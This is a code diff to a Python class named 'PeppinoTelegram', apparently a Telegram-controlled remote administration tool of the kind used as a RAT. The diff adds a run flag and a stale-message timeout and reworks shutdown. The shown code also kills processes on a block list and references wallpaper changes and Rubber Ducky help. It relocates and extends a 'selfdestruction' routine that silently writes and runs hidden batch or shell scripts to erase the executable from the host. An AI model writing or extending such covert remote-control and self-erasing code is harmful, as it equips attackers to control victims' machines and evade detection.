@@ -721,6 +721,8 @@ class PeppinoTelegram:
             self.duckyhelp = DUCKYHELP
             self.explorer_path = getcwd()
             self.audio_mixer = mixer
+            self.running = True
+            self.message_timeout = 5
             self.process_explorer_menu = None
             self.explorer_message = None
             self.mixer_menu_keyboard = None
@@ -843,7 +845,7 @@ class PeppinoTelegram:
             self.bsend(f"Added {process} to cantopenlist.")
 
         def cantopenkiller(self) -> None:
-            while True:
+            while self.running:
                 for process in self.cantopenlist:
                     if self.check_if_proc_running(process):
                         self.terminate_process_by_name(process)
@@ -1197,6 +1199,9 @@ class PeppinoTelegram:
 
         def parse_text(self, msg: dict) -> None:
             text = msg["text"]
+            date = int(msg["date"])
+            if (date+self.message_timeout)<time():
+                return
             if text == "/start":
                 return None
             elif ";" in text:
@@ -1524,6 +1529,23 @@ class PeppinoTelegram:
             self.closecap()
             self.restore_wallpaper()
 
+        def selfdestruction(self) -> None:
+            current_file = realpath(sys.argv[0])
+            temp_dir = gettempdir()
+            if iswindows:
+                bat_file = join(temp_dir, "delete_me.bat")
+                with open(bat_file, "w") as f:
+                    f.write(f':loop\ndel "{current_file}" > nul\nif exist "{current_file}" goto loop\ndel "%~f0"')
+                Popen(['cmd', '/c', bat_file], creationflags=CREATE_NO_WINDOW)
+            else:
+                sh_file = join(temp_dir, "delete_me.sh")
+                with open(sh_file, "w") as f:
+                    f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
+                chmod(sh_file, 0o700)
+                Popen(['sh', sh_file]) 
+            self.bsend(f"🛑 Removing executable.")
+            self.stop()
+
         def show_image(self, image_path: str) -> None:
             try:
                 imshow("Warning", resize(imread(image_path), (400, 400)))
@@ -1543,11 +1565,12 @@ class PeppinoTelegram:
                 sp_win.start()
 
         def start(self) -> None:
+            #Getting rid of old shi
             try:
                 self.bot.deleteWebhook()
             except MaxRetryError:
                 sys.exit() 
-            self.update_commands()
+            self.bot.getUpdates()
             self.images = load_images()
             nomemes = list(self.images.copy().keys())
             self.nomemes = filter(lambda x: not("meme" in x), nomemes)
@@ -1564,15 +1587,16 @@ class PeppinoTelegram:
                 self.bsend(botstartedmessage)
             loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
             loop.run_as_thread()
-            while 1:
+            while self.running:
                 try:
-                    sleep(0.01)
+                    sleep(1)
                 except KeyboardInterrupt:
                     self.bsend("🛑 Interrupted by host machine, bye bye.")
-                    self.clear()
-                    break
+                    self.running = False
 
         def stop(self) -> None:
+            self.running = False
+            self.clear()
             self.bsend("🛑 Interrupted by you, bye bye.")
             sys.exit()
 
@@ -1587,22 +1611,6 @@ class PeppinoTelegram:
             payload = {'commands': commands}
             response = requests.post(url, json=payload)
             return response.status_code == 200
-
-        def selfdestruction(self) -> None:
-            current_file = realpath(sys.argv[0])
-            temp_dir = gettempdir()
-            if iswindows:
-                bat_file = join(temp_dir, "delete_me.bat")
-                with open(bat_file, "w") as f:
-                    f.write(f':loop\ndel "{current_file}" > nul\nif exist "{current_file}" goto loop\ndel "%~f0"')
-                Popen(['cmd', '/c', bat_file], creationflags=CREATE_NO_WINDOW)
-            else:
-                sh_file = join(temp_dir, "delete_me.sh")
-                with open(sh_file, "w") as f:
-                    f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
-                chmod(sh_file, 0o700)
-                Popen(['sh', sh_file]) 
-            self.stop()
 
         def waitforface(self, timeout=60):
             start = time()
